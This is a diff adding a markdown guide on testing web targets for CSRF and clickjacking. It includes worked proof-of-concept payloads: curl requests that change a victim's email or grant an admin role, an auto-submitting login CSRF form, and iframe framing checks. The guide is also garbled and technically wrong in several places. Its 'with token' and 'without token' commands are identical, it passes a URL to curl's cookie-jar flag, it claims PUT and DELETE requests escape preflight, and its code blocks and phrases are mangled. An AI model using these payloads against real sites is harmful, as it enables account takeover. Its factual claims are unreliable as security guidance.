@@ -1,0 +1,68 @@
+# HOW TO TEST CSRF & CLICKJACKING ON A TARGET (2026 expert guide)
+> **Author:** MD MAHABUBUR RAHMAN
+
+## THE CSRF TESTS (all ways)
+1. Same-origin-form CSRF: no CSRF token = classic (POST + cookies auto-sent).
+2. Token in URL/GET: token leaks via referer/logs -> not a real defense.
+3. Token not validated server-side: present-but-ignored (common!).
+4. Token per-session vs per-request: reuse a token from session start on later requests.
+5. Token tied to session but not to request: same token across users is fine only if bound server-side.
+6. JSON endpoints: no SameSite + content-type sniffing, PUT/DELETE without preflight on same-origin.
+7. Custom header check bypass: only X-Requested-With checked - send it, and it's not CSRF-safe.
+8. Origin/Referer validation bypass: empty Origin, null Origin, case/path variants.
+9. CSRF in multi-request flows: CSRF on step 2 that you can chain after step 1 with no token.
+10. Login/Logout CSRF (highest impact: no victim interaction needed to force other vulns).
+
+## Step-by-step on target
+1. Pick a state-changing request (POST /api/user/email, password change, payment confirm).
+2. Inspect request: does it carry a token? If yes - remove it, retry (that's the test).
+3. If a token exists - copy the SAME token from another request/session and try again.
+4. If removed/reused still works -> that endpoint is CSRF-vulnerable.
+5. Craft PoC: form with auto-submit to same-origin of TARGET (host on attacker page).
+6. Test methods: POST -> also try PUT/PATCH/DELETE + JSON contenttype with no preflight.
+7. Browser test: victim cookie jar intact; the silent redirect proves it.
+
+## CLICKJACKING TESTS
+1. Load target in iframe from attacker page:
+```
+   <iframe src="https://target.com/settings" style="opacity:0;position:absolute"></iframe>
+```
+2. If it LOADS (no X-Frame-Options, no CSP frame-ancestors) -> frameable.
+3. Confirm sensitive flows: logout buttons, payment confirmation, password reset - drag "bait" UI over real buttons.
+4. CSP aside: X-Frame-Options: DENY/SAMEORIGIN blocks; missing ones = frameable.
+5. Combine with CSRF: clickjacking often fills the interaction-gap for token-protected endpoints (double-click CSRF).
+
+## False positives
+- 403 on token-removal means it IS protected. 200 means flag it.
+- SameSite=Lax blocks most cross-site POSTs - test only if cookies are None/absent or you have SameSite=SameSite=None bugbounty specifics.
+- CSP frame-ancestors missing but X-Frame-Options present = still frameable on some browsers? (XFO wins broadly) - report accurately.
+
+## Tools
+- Burp CSRF PoC generator, XSStrike-adjacent auto PoC, Simple clickjacking tester, OWASP ZAP.
+- bucabupa/CSRFTester for flow testing.
+
+## WORKED EXAMPLES (concrete)
+A. Token-removal test on state change:
+```
+curl -i -b "session=AAA" -X POST "https://target.com/api/email" -d "email=pwn@a.com"
+then WITHOUT token:
+curl -i -b "session=AAA" -X POST "https://target.com/api/email" -d "email=pwn@a.com"   # 200 = vulnerable
+B. Token reuse across sessions (login as B, replay A's token):
+curl -i -b "session=BBB" -X POST "https://target.com/api/email" -d "token=TOKEN_FROM_A&email=pwn@a.com"
+C. SameSite/JSON no-preflight:
+curl -i -X PUT -H "Content-Type: application/json;charset=UTF-8" \
+```
+     -d '{"role":"admin"}' -b "session=AAA" -c "https://target.com/api/grant"
+(if only X-Requested-With checked, this works cross-site - no custom header needed)
+D. Login CSRF PoC (login user forced onto attacker's account):
+<html><body><form action="https://target.com/login" method="POST">
+<input name="username" value="attacker">
+<input name="password" value="attackerpw">
+<script>document.forms[0].submit()</script>
+E. Clickjacking iframe check:
+<iframe src="https://target.com/account" width="100%" height="100%"></iframe>
+loads = frameable. To exploit drone the victim UI over the real button. Check headers:
+```
+curl -i "https://target.com/account" | grep -i "x-frame-options\|frame-ancestors"
+F. double-click CSRF (for token-protected payments): iframe that clicks "Confirm" twice.
+```
